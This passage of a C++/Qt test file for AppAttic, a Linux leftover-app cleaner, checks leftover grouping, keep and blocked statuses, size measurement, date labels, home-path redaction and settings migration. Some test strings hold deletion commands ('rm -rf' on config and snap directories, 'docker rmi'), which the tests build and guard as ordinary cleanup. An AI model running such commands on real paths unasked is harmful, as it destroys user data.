    cdB.plugin = QStringLiteral("path-xdg-data");
    cdB.path = QStringLiteral("/home/alice/.local/share/gone-app");
    cdB.bytes = 20;
    crossDir << cdA << cdB;
    groupLinuxLeftovers(crossDir);
    if (crossDir.size() != 2 || crossDir[0].extraPaths.size() != 0
        || crossDir[1].extraPaths.size() != 0) {
        std::fprintf(stderr,
            "groupLinuxLeftovers: same-name leftovers in different parents must not merge\n");
        return 1;
    }
    QVector<Finding> keepGroup;
    Finding keepFx;
    keepFx.plugin = QStringLiteral("path-home-dot");
    keepFx.kind = QStringLiteral("orphan-dir");
    keepFx.status = QStringLiteral("keep");
    keepFx.name = QStringLiteral(".mozilla");
    keepFx.path = QStringLiteral("/home/alice/.mozilla");
    Finding orphanFx;
    orphanFx.plugin = QStringLiteral("path-xdg-config");
    orphanFx.kind = QStringLiteral("orphan-dir");
    orphanFx.status = QStringLiteral("orphaned");
    orphanFx.name = QStringLiteral("firefox");
    // A sibling of the `.mozilla` row, so this case is refused because the
    // status is `keep`, not because the two sit under different parents.
    orphanFx.path = QStringLiteral("/home/alice/firefox");
    keepGroup << keepFx << orphanFx;
    groupLinuxLeftovers(keepGroup);
    if (keepGroup.size() != 2) {
        std::fprintf(stderr, "groupLinuxLeftovers: keep leftover must not merge into an orphan\n");
        return 1;
    }
    QVector<Finding> aliasGroup;
    Finding moz;
    moz.plugin = QStringLiteral("path-home-dot");
    moz.kind = QStringLiteral("orphan-dir");
    moz.status = QStringLiteral("orphaned");
    moz.name = QStringLiteral(".mozilla");
    moz.path = QStringLiteral("/home/alice/.mozilla");
    moz.bytes = 5;
    Finding fx;
    fx.plugin = QStringLiteral("path-xdg-config");
    fx.kind = QStringLiteral("orphan-dir");
    fx.status = QStringLiteral("orphaned");
    fx.name = QStringLiteral("firefox");
    // Siblings of the `.mozilla` row, so the alias grouping has something to
    // merge. The same name under a different parent stays its own row, which
    // the cross-directory case above pins.
    fx.path = QStringLiteral("/home/alice/firefox");
    fx.bytes = 7;
    aliasGroup << moz << fx;
    groupLinuxLeftovers(aliasGroup);
    if (aliasGroup.size() != 1 || aliasGroup[0].extraPaths.size() != 1) {
        std::fprintf(stderr, "groupLinuxLeftovers: firefox/mozilla orphans must merge\n");
        return 1;
    }
    Finding snapOrphan;
    snapOrphan.plugin = QStringLiteral("snapd");
    snapOrphan.kind = QStringLiteral("orphan-dir");
    snapOrphan.path = QStringLiteral("/home/alice/snap/gone-app");
    const QString snapRm = leftoverCleanupCommand(snapOrphan);
    if (!snapRm.contains(QLatin1String("rm -rf ")) || !snapRm.contains(QLatin1Char('\''))) {
        std::fprintf(stderr, "leftoverCleanupCommand: snap orphan-dir must be quoted rm -rf\n");
        return 1;
    }
    QSet<QString> desks;
    desks.insert(QStringLiteral("firefox"));
    desks.insert(QStringLiteral("code"));
    if (!leftoverNameMatchesDesktop(QStringLiteral("firefox"), desks)
        || !leftoverNameMatchesDesktop(QStringLiteral("Code"), desks)
        || !leftoverNameMatchesDesktop(QStringLiteral(".mozilla"), desks)
        || leftoverNameMatchesDesktop(QStringLiteral("gone-app"), desks)
        || leftoverNameMatchesDesktop(QStringLiteral("firefox-esr"), desks)
        || leftoverNameMatchesDesktop(QStringLiteral("git"), desks)) {
        std::fprintf(stderr, "leftoverNameMatchesDesktop: installed desktop stem matching\n");
        return 1;
    }
    // markOwnedPathLeftovers must mark from the injected stem set, not from a
    // fresh read of the machine's application directories: a scan reads the set
    // once and threads it through, so a caller's set is the only input. An
    // empty set matches nothing, and a set the caller supplies marks its row.
    {
        QVector<Finding> rows;
        Finding matched;
        matched.plugin = QStringLiteral("path-xdg-config");
        matched.kind = QStringLiteral("orphan-dir");
        matched.name = QStringLiteral("firefox");
        matched.path = QStringLiteral("/home/alice/.config/firefox");
        matched.status = QStringLiteral("orphaned");
        rows << matched;
        Finding unmatched = matched;
        unmatched.name = QStringLiteral("gone-app");
        unmatched.path = QStringLiteral("/home/alice/.config/gone-app");
        rows << unmatched;

        // Empty set: nothing is marked, so a machine whose stems failed to read
        // leaves every row as the scan reported it.
        QVector<Finding> emptyRows = rows;
        markOwnedPathLeftovers(emptyRows, QSet<QString>());
        for (const Finding &f : emptyRows) {
            if (f.status != QLatin1String("orphaned")) {
                std::fprintf(stderr, "markOwnedPathLeftovers: empty stem set must mark nothing\n");
                return 1;
            }
        }

        // Supplied set: only the matching row becomes "keep", the other stays.
        QVector<Finding> markedRows = rows;
        markOwnedPathLeftovers(markedRows, desks);
        if (markedRows.at(0).status != QLatin1String("keep")) {
            std::fprintf(stderr, "markOwnedPathLeftovers: matching row must become keep\n");
            return 1;
        }
        if (markedRows.at(1).status != QLatin1String("orphaned")) {
            std::fprintf(stderr, "markOwnedPathLeftovers: non-matching row must stay orphaned\n");
            return 1;
        }

        // Same two rows in the opposite order, so the non-matching row is not
        // always the one the loop reaches second. This is the failure the
        // check exists for: a row the set does not name must keep the status
        // the scan gave it, whichever position it sits in.
        QVector<Finding> reversed;
        reversed << rows.at(1) << rows.at(0);
        markOwnedPathLeftovers(reversed, desks);
        if (reversed.at(0).status != QLatin1String("orphaned")) {
            std::fprintf(stderr, "markOwnedPathLeftovers: leading non-matching row changed\n");
            return 1;
        }
        if (reversed.at(1).status != QLatin1String("keep")) {
            std::fprintf(stderr, "markOwnedPathLeftovers: trailing matching row not marked\n");
            return 1;
        }

        // A row that is already "keep" is left alone.
        QVector<Finding> alreadyKeep = rows;
        alreadyKeep[0].status = QStringLiteral("keep");
        markOwnedPathLeftovers(alreadyKeep, desks);
        if (alreadyKeep.at(0).status != QLatin1String("keep")) {
            std::fprintf(stderr, "markOwnedPathLeftovers: an existing keep must not change\n");
            return 1;
        }

        // A shadow overlay is a leftover whose name an installed stem can
        // match, so the isShadowFinding guard is the only thing keeping it out
        // of this pass. Marking it "keep" is not cosmetic: "keep" is in
        // leftoverStatusBlocksCleanup and "shadow" is not, so a marked overlay
        // stops being removable and the user loses the one cleanup the row
        // exists for (remove the overlay, keep the packaged copy). The same
        // holds for a row carrying a packagedPath, the other spelling
        // isShadowFinding answers to.
        QVector<Finding> shadowRows = rows;
        shadowRows[0].kind = QStringLiteral("shadow");
        shadowRows[0].status = QStringLiteral("shadow");
        shadowRows[0].packagedPath = QStringLiteral("/usr/bin/firefox");
        markOwnedPathLeftovers(shadowRows, desks);
        if (shadowRows.at(0).status != QLatin1String("shadow")) {
            std::fprintf(stderr,
                "markOwnedPathLeftovers: a shadow overlay must keep its status, got %s\n",
                qPrintable(shadowRows.at(0).status));
            return 1;
        }
        if (leftoverStatusBlocksCleanup(shadowRows.at(0).status)) {
            std::fprintf(stderr,
                "markOwnedPathLeftovers: the overlay row is no longer removable\n");
            return 1;
        }
        // A shadow row and a plain row of the same shape together, so the guard
        // above is about the shadow row's own kind and not about this leftover
        // name or about position in the vector.
        QVector<Finding> shadowAndPlain = rows;
        shadowAndPlain[0].kind = QStringLiteral("shadow");
        shadowAndPlain[0].status = QStringLiteral("shadow");
        markOwnedPathLeftovers(shadowAndPlain, desks);
        if (shadowAndPlain.at(0).status != QLatin1String("shadow")
            || shadowAndPlain.at(1).status != QLatin1String("orphaned")) {
            std::fprintf(stderr, "markOwnedPathLeftovers: the shadow guard skipped the wrong row\n");
            return 1;
        }
    }
    if (matchPage(leftover, Page::DiskUsage) || !matchPage(leftover, Page::Leftovers)) {
        std::fprintf(stderr, "disk: leftover must not appear on Disk Usage\n");
        return 1;
    }
    {
        QTemporaryDir tmp;
        if (!tmp.isValid()) {
            std::fprintf(stderr, "leftover size: temp dir failed\n");
            return 1;
        }
        const QString dir = tmp.path() + QStringLiteral("/gone-app");
        if (!QDir().mkpath(dir)) {
            std::fprintf(stderr, "leftover size: mkpath failed\n");
            return 1;
        }
        QFile f(dir + QStringLiteral("/data.bin"));
        if (!f.open(QIODevice::WriteOnly) || f.write(QByteArray(4096, 'x')) != 4096) {
            std::fprintf(stderr, "leftover size: write failed\n");
            return 1;
        }
        f.close();
        Finding sized;
        sized.plugin = QStringLiteral("path-xdg-config");
        sized.kind = QStringLiteral("orphan-dir");
        sized.status = QStringLiteral("orphaned");
        sized.path = dir;
        QVector<Finding> one;
        one << sized;
        enrichLeftoverSizes(one);
        if (one[0].bytes < 4096) {
            std::fprintf(stderr, "leftover size: expected measured bytes, got %lld\n",
                static_cast<long long>(one[0].bytes));
            return 1;
        }
        QVector<Finding> many;
        for (int i = 0; i < 8; ++i) {
            const QString sub = tmp.path() + QStringLiteral("/gone-%1").arg(i);
            if (!QDir().mkpath(sub)) {
                std::fprintf(stderr, "leftover size: parallel mkpath failed\n");
                return 1;
            }
            QFile part(sub + QStringLiteral("/data.bin"));
            if (!part.open(QIODevice::WriteOnly) || part.write(QByteArray(4096, 'x')) != 4096) {
                std::fprintf(stderr, "leftover size: parallel write failed\n");
                return 1;
            }
            part.close();
            Finding row = sized;
            row.path = sub;
            row.name = QStringLiteral("gone-%1").arg(i);
            many << row;
        }
        enrichLeftoverSizes(many);
        for (int i = 0; i < many.size(); ++i) {
            if (many[i].bytes < 4096) {
                std::fprintf(stderr, "leftover size: parallel %d got %lld\n",
                    i, static_cast<long long>(many[i].bytes));
                return 1;
            }
        }
        const QDir homeCfg(QDir::home().filePath(QStringLiteral(".config")));
        QString liveName;
        const QStringList prefer = {
            QStringLiteral("atopile"),
            QStringLiteral("cachyos-hello.json"),
            QStringLiteral("cachyos"),
        };
        for (const QString &n : prefer) {
            if (QFileInfo::exists(homeCfg.filePath(n))) {
                liveName = n;
                break;
            }
        }
        if (liveName.isEmpty()) {
            const QStringList files = homeCfg.entryList(QDir::Files);
            if (!files.isEmpty()) liveName = files.first();
        }
        if (homeCfg.exists() && !liveName.isEmpty()) {
            QJsonObject finding;
            finding.insert(QStringLiteral("kind"), QStringLiteral("orphan-dir"));
            finding.insert(QStringLiteral("name"), liveName);
            finding.insert(QStringLiteral("path"),
                QStringLiteral("/home/user/.config/") + liveName);
            finding.insert(QStringLiteral("status"), QStringLiteral("orphaned"));
            QJsonObject blob;
            blob.insert(QStringLiteral("plugin"), QStringLiteral("path-xdg-config"));
            blob.insert(QStringLiteral("findings"), QJsonArray{finding});
            QVector<Finding> live;
            appendFindingsFromBlob(live, QJsonDocument(blob).toJson(QJsonDocument::Compact));
            if (live.size() != 1) {
                std::fprintf(stderr, "leftover size: live leftover JSON ingest\n");
                return 1;
            }
            if (QDir::homePath() != QLatin1String("/home/user")
                && live[0].path.contains(QLatin1String("/home/user/"))) {
                std::fprintf(stderr, "leftover size: /home/user path not expanded (%s)\n",
                    live[0].path.toUtf8().constData());
                return 1;
            }
            if (!QFileInfo::exists(live[0].path)) {
                std::fprintf(stderr, "leftover size: expanded live path missing (%s)\n",
                    live[0].path.toUtf8().constData());
                return 1;
            }
            enrichLeftoverSizes(live);
            if (live[0].bytes < 0) {
                std::fprintf(stderr, "leftover size: live leftover still unknown (%s)\n",
                    live[0].path.toUtf8().constData());
                return 1;
            }
        }
    }
    Finding owned;
    owned.plugin = QStringLiteral("path-xdg-config");
    owned.status = QStringLiteral("keep");
    owned.kind = QStringLiteral("orphan-dir");
    owned.name = QStringLiteral("firefox");
    if (matchPage(owned, Page::Leftovers)) {
        std::fprintf(stderr, "leftovers: keep/owned leftover must not list on Leftovers\n");
        return 1;
    }
    // Every blocked status, through every gate, not just "keep" through the
    // one this function happened to exercise. `canMarkCleanup` refused only
    // "keep", so a leftover carrying "owned" or "system" was held back twice
    // over: once by the status it did not check, and once by its cleanup
    // command coming back empty. Ask the predicate directly, and give each row
    // a path a command would otherwise be built from, so the status is the
    // only thing that can stop it.
    for (const char *blocked : {"keep", "owned", "system"}) {
        Finding row;
        row.plugin = QStringLiteral("path-xdg-config");
        row.status = QLatin1String(blocked);
        row.kind = QStringLiteral("orphan-dir");
        row.name = QStringLiteral("firefox");
        row.path = QStringLiteral("/home/alice/.config/gone-app");
        row.bytes = 1024;
        if (!leftoverStatusBlocksCleanup(row.status)) {
            std::fprintf(stderr, "blocked statuses: %s must block cleanup\n", blocked);
            return 1;
        }
        if (matchPage(row, Page::Leftovers)) {
            std::fprintf(stderr, "blocked statuses: %s must not list on Leftovers\n", blocked);
            return 1;
        }
        if (canMarkCleanup(row, Page::Leftovers)) {
            std::fprintf(stderr, "blocked statuses: %s must not be tickable\n", blocked);
            return 1;
        }
        if (!leftoverCleanupCommand(row).isEmpty()) {
            std::fprintf(stderr, "blocked statuses: %s must produce no cleanup command\n", blocked);
            return 1;
        }
    }
    // The leftover cases above are stopped twice over, once by the status and
    // once by the empty command, so they cannot tell the two guards apart. A
    // row that is not a leftover has no `leftoverCleanupCommand` to fall back
    // on: it reaches the tail of `canMarkCleanup`, which before the fix tested
    // only "keep" and so accepted any plugin row carrying "owned" or "system"
    // with a non-empty command. This is the case that actually moved.
    for (const char *blocked : {"owned", "system"}) {
        Finding row;
        row.plugin = QStringLiteral("container-runtime");
        row.status = QLatin1String(blocked);
        row.kind = QStringLiteral("dangling-image");
        row.id = QStringLiteral("sha256:abc");
        row.name = QStringLiteral("<none>:<none>");
        row.command = QStringLiteral("docker rmi sha256:abc");
        if (canMarkCleanup(row, Page::Leftovers)) {
            std::fprintf(stderr, "blocked statuses: non-leftover %s must not be tickable\n", blocked);
            return 1;
        }
    }
    return 0;
}

static int checkTiming() {
    const QDateTime z = parseIsoInstant(QStringLiteral("2026-08-17T12:30:00Z"));
    const QDateTime offset = parseIsoInstant(QStringLiteral("2026-08-17T12:30:00+00:00"));
    if (!z.isValid() || !offset.isValid()
        || qAbs(z.toUTC().toSecsSinceEpoch() - offset.toUTC().toSecsSinceEpoch()) > 0) {
        std::fprintf(stderr, "timing: Z and +00:00 must be the same instant\n");
        return 1;
    }
    const QDateTime naive = parseIsoInstant(QStringLiteral("2026-04-01T15:00:00"));
    const QDateTime naiveZ = parseIsoInstant(QStringLiteral("2026-04-01T15:00:00Z"));
    if (!naive.isValid() || naive.toUTC().toSecsSinceEpoch() != naiveZ.toUTC().toSecsSinceEpoch()) {
        std::fprintf(stderr, "timing: timezone-less ISO must be UTC\n");
        return 1;
    }
    const QDateTime micro = parseIsoInstant(QStringLiteral("2026-04-01T15:00:00.123456Z"));
    if (!micro.isValid()
        || qAbs(micro.toMSecsSinceEpoch() - naiveZ.toMSecsSinceEpoch() - 123) > 1) {
        std::fprintf(stderr, "timing: XBEL microseconds truncated to millis\n");
        return 1;
    }

    Finding idle;
    idle.idleDays = 120;
    if (modifiedLabel(idle) != localeCount(120) + QLatin1String(" days ago")) {
        std::fprintf(stderr, "timing: idleDays label\n");
        return 1;
    }
    Finding today;
    today.mtime = QDateTime::currentDateTimeUtc().toString(Qt::ISODate);
    if (modifiedLabel(today) != QLatin1String("Today")) {
        std::fprintf(stderr, "timing: current UTC mtime should be Today (%s)\n",
            modifiedLabel(today).toUtf8().constData());
        return 1;
    }

    const QTimeZone ny(QByteArray("America/New_York"));
    if (ny.isValid()) {
        // 2026-03-08 04:30 UTC is 2026-03-07 23:30 EST (spring-forward is 07:00 UTC).
        const QDateTime utc = parseIsoInstant(QStringLiteral("2026-03-08T04:30:00Z"));
        if (!utc.isValid() || utc.toTimeZone(ny).date() != QDate(2026, 3, 7)) {
            std::fprintf(stderr, "timing: UTC instant must be previous local day in New York\n");
            return 1;
        }
        Finding crossed;
        crossed.mtime = QStringLiteral("2026-03-08T04:30:00Z");
        const QDateTime nyNow(QDate(2026, 9, 2), QTime(12, 0), ny);
        // Beyond the relative window the label is the local date in the user's
        // own date format, so compare against that format.
        const QString nyExpected = localeDateLabel(QDate(2026, 3, 7));
        if (modifiedLabel(crossed, nyNow) != nyExpected) {
            std::fprintf(stderr,
                "timing: UTC prefix must not win over local date (%s, want %s)\n",
                modifiedLabel(crossed, nyNow).toUtf8().constData(),
                nyExpected.toUtf8().constData());
            return 1;
        }
        Finding future;
        future.mtime = QStringLiteral("2026-09-04T12:00:00Z");
        const QDateTime nyNow2(QDate(2026, 9, 2), QTime(12, 0), ny);
        const QString futureExpected = localeDateLabel(parseIsoInstant(future.mtime).toTimeZone(ny).date());
        if (modifiedLabel(future, nyNow2) != futureExpected) {
            std::fprintf(stderr,
                "timing: a future mtime must show its local date (%s, want %s)\n",
                modifiedLabel(future, nyNow2).toUtf8().constData(),
                futureExpected.toUtf8().constData());
            return 1;
        }
        const QDateTime saturday(QDate(2026, 3, 7), QTime(23, 30), ny);
        const QDateTime sunday(QDate(2026, 3, 8), QTime(22, 30), ny);
        if (saturday.secsTo(sunday) >= 86400) {
            std::fprintf(stderr, "timing: expected spring-forward elapsed < 24h\n");
            return 1;
        }
        if (saturday.toTimeZone(ny).date().daysTo(sunday.toTimeZone(ny).date()) != 1) {
            std::fprintf(stderr, "timing: spring-forward must still be one local calendar day\n");
            return 1;
        }
        const QDateTime morning(QDate(2026, 11, 1), QTime(0, 0), ny);
        const QDateTime evening(QDate(2026, 11, 1), QTime(23, 30), ny);
        if (morning.secsTo(evening) <= 86400) {
            std::fprintf(stderr, "timing: expected fall-back elapsed > 24h\n");
            return 1;
        }
        if (morning.toTimeZone(ny).date().daysTo(evening.toTimeZone(ny).date()) != 0) {
            std::fprintf(stderr, "timing: fall-back same local day must stay today\n");
            return 1;
        }
    }

    Finding dateOnly;
    dateOnly.mtime = QStringLiteral("2026-08-17");
    const QString dateLabel = modifiedLabel(dateOnly);
    if (dateLabel == QLatin1String("unknown")) {
        std::fprintf(stderr, "timing: date-only mtime must parse\n");
        return 1;
    }
    // The bare date is UTC midnight, the same instant parseISODate gives it, so
    // both windows put one stored value on the same day whatever zone each runs
    // in. Local midnight here would shift the row a day for every zone that is
    // not UTC.
    const QDateTime dateOnlyInstant = parseIsoInstant(QStringLiteral("2026-08-17"));
    const QDateTime explicitMidnight = parseIsoInstant(QStringLiteral("2026-08-17T00:00:00Z"));
    if (!dateOnlyInstant.isValid() || dateOnlyInstant.toUTC() != explicitMidnight.toUTC()) {
        std::fprintf(stderr, "timing: date-only mtime must be UTC midnight\n");
        return 1;
    }

    std::fprintf(stdout, "timing: ok\n");
    return 0;
}

static int checkPrivacy() {
    const QString home = QStringLiteral("/home/alice");
    const QString redacted = redactHomePaths(
        QStringLiteral("rm: cannot remove '/home/alice/Library/Caches/Foo': Permission denied"),
        home);
    if (redacted.contains(QLatin1String("/home/alice"))) {
        std::fprintf(stderr, "redact: home path remains (%s)\n", redacted.toUtf8().constData());
        return 1;
    }
    if (!redacted.contains(QLatin1String("~/Library/Caches/Foo"))) {
        std::fprintf(stderr, "redact: expected tilde path (%s)\n", redacted.toUtf8().constData());
        return 1;
    }
    const QString neighbor = redactHomePaths(QStringLiteral("/home/alice2/secret"), home);
    if (!neighbor.contains(QLatin1String("/home/alice2"))) {
        std::fprintf(stderr, "redact: over-redacted neighbor home\n");
        return 1;
    }
    // A decomposed mount spells a path with combining marks, and NFC and NFD
    // are different directories there. Both spellings of the home path have to
    // redact, and the paths around it have to come out spelled exactly as they
    // went in, or the user copies back a name that does not exist.
    const QString decomposedHome = QString::fromUtf8("/home/alic\x65\xCC\x81");
    const QString nfdPath = QString::fromUtf8("/home/alic\x65\xCC\x81/caf\xC3\xA9");
    const QString decomposed = redactHomePaths(
        QString::fromUtf8("rm: cannot remove '") + nfdPath + QLatin1Char('\''),
        decomposedHome);
    if (decomposed != QString::fromUtf8("rm: cannot remove '~/caf\xC3\xA9'")) {
        std::fprintf(stderr, "redact: decomposed home path not redacted in place (%s)\n", decomposed.toUtf8().constData());
        return 1;
    }
    // The XDG roots take precedence over the home fallback, so the home-only
    // expectations below are pinned to an unset environment rather than to
    // whatever the test machine exports.
    const QByteArray savedXdgConfig = qgetenv("XDG_CONFIG_HOME");
    const QByteArray savedXdgData = qgetenv("XDG_DATA_HOME");
    const auto restoreXdg = [&] {
        for (const auto &pair : {qMakePair("XDG_CONFIG_HOME", savedXdgConfig),
                                 qMakePair("XDG_DATA_HOME", savedXdgData)}) {
            if (pair.second.isEmpty()) {
                qunsetenv(pair.first);
            } else {
                qputenv(pair.first, pair.second);
            }
        }
    };
    qunsetenv("XDG_CONFIG_HOME");
    qunsetenv("XDG_DATA_HOME");
    bool expandOk =
        expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/home/alice/.config/gone-app")
        && expandHomeUserPlaceholder(QStringLiteral("rm -rf /home/user/.config/gone-app"), home)
            == QStringLiteral("rm -rf /home/alice/.config/gone-app");
    // A configured root is the directory the core scanned, so that is the path
    // a finding has to name, at the root and below it alike.
    qputenv("XDG_CONFIG_HOME", "/srv/u/config");
    qputenv("XDG_DATA_HOME", "/srv/u/data");
    expandOk = expandOk
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/srv/u/config/gone-app")
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.local/share/applications/foo.desktop"), home)
            == QStringLiteral("/srv/u/data/applications/foo.desktop");
    // A relative value is ignored, so the default root stands.
    qputenv("XDG_CONFIG_HOME", "relative/config");
    expandOk = expandOk
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/home/alice/.config/gone-app");
    // Padded is the same directory, and `/` is a root like any other: both are
    // read that way by `Sources/AppAtticScan/Paths.swift` and `core/host/
    // hostexec.c`, so a value only this reader refused named a directory the
    // scan never looked in.
    qputenv("XDG_CONFIG_HOME", "  /srv/u/config  ");
    qputenv("XDG_DATA_HOME", "/");
    expandOk = expandOk
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/srv/u/config/gone-app")
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.local/share/applications/foo.desktop"), home)
            == QStringLiteral("/applications/foo.desktop");
    restoreXdg();
    if (!expandOk) {
        std::fprintf(stderr, "expand: /home/user and XDG root expansion\n");
        return 1;
    }
    if (expandHomeUserPlaceholder(QStringLiteral("/home/username/foo"), home)
        != QStringLiteral("/home/username/foo")) {
        std::fprintf(stderr, "expand: over-replaced username\n");
        return 1;
    }
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "redact: temp dir failed\n");
        return 1;
    }
    const QString dir = tmp.filePath(QStringLiteral("appattic"));
    if (!QDir().mkpath(dir)) {
        std::fprintf(stderr, "redact: mkpath failed\n");
        return 1;
    }
    const QString path = dir + QStringLiteral("/settings.json");
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly) || f.write("{}") != 2) {
        std::fprintf(stderr, "redact: write failed\n");
        return 1;
    }
    f.close();
    restrictPrivateDataFile(path);
    const QFile::Permissions filePerms = QFileInfo(path).permissions();
    const QFile::Permissions dirPerms = QFileInfo(dir).permissions();
    if (filePerms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
            | QFileDevice::WriteGroup | QFileDevice::WriteOther)) {
        std::fprintf(stderr, "redact: settings file is group/other readable\n");
        return 1;
    }
    if (dirPerms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
            | QFileDevice::ExeGroup | QFileDevice::ExeOther)) {
        std::fprintf(stderr, "redact: appattic dir is group/other accessible\n");
        return 1;
    }
    std::fprintf(stdout, "redact: ok\n");
    return 0;
}

/// The legacy QSettings file holds the ignore list, which is absolute paths
/// under the account's own home, and QSettings wrote it readable by group and
/// other. The migration is the only code that knows which file that is, so
/// the mode is asserted there, and so is the removal that follows it: once the
/// values are in settings.json the old file is a second copy of those paths
/// that nothing opens. The QSettings path is pointed at a temp dir first:
/// the default one is the real ~/.config, which the test must not read or
/// rewrite.
static int checkLegacySettingsMigration() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "legacy: temp dir failed\n");
        return 1;
    }
    const QSettings::Format savedFormat = QSettings::defaultFormat();
    // The redirect has to name the format the two-argument constructor
    // actually resolves to. `migrateLegacyQSettings` builds
    // `QSettings("AppAttic", "AppAttic")`, and on Qt 6 that is the platform
    // default backend, not IniFormat: pointing setPath at IniFormat while the
    // call under test reads the default leaves the fixture in the temp dir and
    // the migration looking in the real ~/.config, which is the one path this
    // test must not read or rewrite.
    QSettings::setPath(savedFormat, QSettings::UserScope, tmp.path());
    const QStringList ignored{QStringLiteral("/home/alice/.config/gone-app")};
    const QString legacyPath = [&] {
        QSettings qs(QStringLiteral("AppAttic"), QStringLiteral("AppAttic"));
        qs.setValue(QStringLiteral("confirmDelete"), true);
        qs.setValue(QStringLiteral("ignoredLeftovers"), ignored);
        qs.sync();
        return QFileInfo(qs.fileName()).absoluteFilePath();
    }();
    if (!QFile::setPermissions(
            legacyPath,
            QFileDevice::ReadOwner | QFileDevice::WriteOwner
                | QFileDevice::ReadGroup | QFileDevice::ReadOther)) {
        std::fprintf(stderr, "legacy: could not widen the fixture mode\n");
        QSettings::setDefaultFormat(savedFormat);
        return 1;
    }
    bool hadValues = false;
    QStringList unreadable;
    QString reportedPath;
    const AppSettings s = migrateLegacyQSettings(&hadValues, &unreadable, &reportedPath);
    const QFile::Permissions perms = QFileInfo(legacyPath).permissions();
    const bool worldReadable = perms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
        | QFileDevice::WriteGroup | QFileDevice::WriteOther);
    const int rc = !hadValues || !unreadable.isEmpty() || s.ignoredLeftoverPaths != ignored
            || !s.confirmDelete || reportedPath != legacyPath || worldReadable
        ? 1
        : 0;
    // The removal is the caller's move after the values are written, so it is
    // checked here as its own step: the file is gone, and a second call on a
    // file that is not there is the wanted state rather than a failure.
    const bool removed = rc == 0 && removeLegacySettingsFile(reportedPath)
        && !QFile::exists(legacyPath) && removeLegacySettingsFile(reportedPath);
    QSettings::setDefaultFormat(savedFormat);
    if (rc != 0) {
        std::fprintf(stderr,
            "legacy: migration did not carry the values and narrow the file "
            "(had=%d unreadable=%lld paths=%lld mode=%o)\n",
            hadValues ? 1 : 0, static_cast<long long>(unreadable.size()),
            static_cast<long long>(s.ignoredLeftoverPaths.size()),
            static_cast<unsigned>(perms & QFileDevice::ReadGroup ? 0040 : 0)
                | static_cast<unsigned>(perms & QFileDevice::ReadOther ? 0004 : 0));
        return rc;
    }
    if (!removed) {
        std::fprintf(stderr, "legacy: the migrated file was not removed\n");
        return 1;
    }
    std::fprintf(stdout, "legacy: ok\n");
    return 0;
}

static int writeFile(const QString &path, const QByteArray &body) {
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly | QIODevice::Truncate)) return 1;
    if (f.write(body) != body.size()) return 1;
    return 0;
}

/// Null on a file that cannot be read, so a check that reads one and gets
/// nothing says which file it was rather than parsing empty bytes.
static QByteArray readFile(const QString &path) {
    QFile f(path);
    if (!f.open(QIODevice::ReadOnly)) return QByteArray();
    return f.readAll();
}

/// Open descriptors in this process, from /proc. -1 where that is unavailable,
/// so a non-Linux run skips the bound instead of failing it.
static int openDescriptorCount() {
    QDir d(QStringLiteral("/proc/self/fd"));
    if (!d.exists()) return -1;
    return int(d.entryList(QDir::AllEntries | QDir::System | QDir::NoDotAndDotDot).size());
}

namespace {

struct FdProbe {
    QAtomicInt peak{0};
};

/// Sampled at the end of every directory's walk: the root's fires last on the
/// first thread, which is the moment the whole deferral is outstanding.
void noteDescriptors(const DiskNode &, void *user) {
    auto *probe = static_cast<FdProbe *>(user);
    const int n = openDescriptorCount();
    int seen = probe->peak.loadAcquire();
    while (n > seen && !probe->peak.testAndSetAcquire(seen, n)) {
        seen = probe->peak.loadAcquire();
    }
}

/// Records the root's totals as the `dirDone` callback saw them. The callback
/// runs on whichever thread finished the directory, so the samples are only
/// safe to compare after the scan returned and every worker has joined.
struct RootDoneProbe {
    QString root;
    QVector<qint64> samples;
};

void noteRootTotals(const DiskNode &node, void *user) {
    auto *probe = static_cast<RootDoneProbe *>(user);
    if (node.path == probe->root) probe->samples.append(node.apparent);
}

} // namespace

/// The root is the one node whose `dirDone` can outrun its own totals: a
/// deferred child's subtree is measured later, on a pool thread, and only
/// reaches the root when the threads are joined. A callback that streams rows
/// as the walk goes then shows a root smaller than the tree it belongs to.
static int checkRootDirDoneTotals() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "root dirDone: temp dir failed\n");
        return 1;
    }
    // Past kMaxDeferredDirFds, so the root's walk really does leave measured
    // subtrees outstanding for the worker phase.
    const int dirCount = 200;
    for (int i = 0; i < dirCount; ++i) {
        const QString sub = QStringLiteral("%1/d%2").arg(tmp.path()).arg(i);
        if (!QDir().mkpath(sub)) {
            std::fprintf(stderr, "root dirDone: mkpath %d failed\n", i);
            return 1;
        }
        if (writeFile(sub + QStringLiteral("/f.bin"), QByteArray(4096, 'x'))) {
            std::fprintf(stderr, "root dirDone: write %d failed\n", i);
            return 1;
        }
    }
    RootDoneProbe probe;
    probe.root = QDir::cleanPath(tmp.path());
    DiskScanOptions opts;
    opts.oneFileSystem = true;
    opts.dirDone = &noteRootTotals;
    opts.user = &probe;
    DiskNode *tree = scanDiskTree(probe.root, opts);
    if (!tree || tree->unreadable) {
        std::fprintf(stderr, "root dirDone: scan produced no tree\n");
        delete tree;
        return 1;
    }
    if (probe.samples.size() != 1) {
        std::fprintf(stderr, "root dirDone: fired %d times for the root, want 1\n",
            int(probe.samples.size()));
        delete tree;
        return 1;
    }
    if (probe.samples[0] != tree->apparent) {
        std::fprintf(stderr, "root dirDone: reported %lld, the tree holds %lld\n",
            static_cast<long long>(probe.samples[0]), static_cast<long long>(tree->apparent));
        delete tree;
        return 1;
    }
    delete tree;
    std::fprintf(stdout, "root dirDone: ok (%lld)\n", static_cast<long long>(probe.samples[0]));
    return 0;
}

/// A wide tree must not sit on one descriptor per directory it defers: the
/// deferred fds are all live until the worker phase starts, so an uncapped
/// deferral holds hundreds at once on a home folder and runs into the process
/// limit. The walk still has to produce every directory and the same totals.
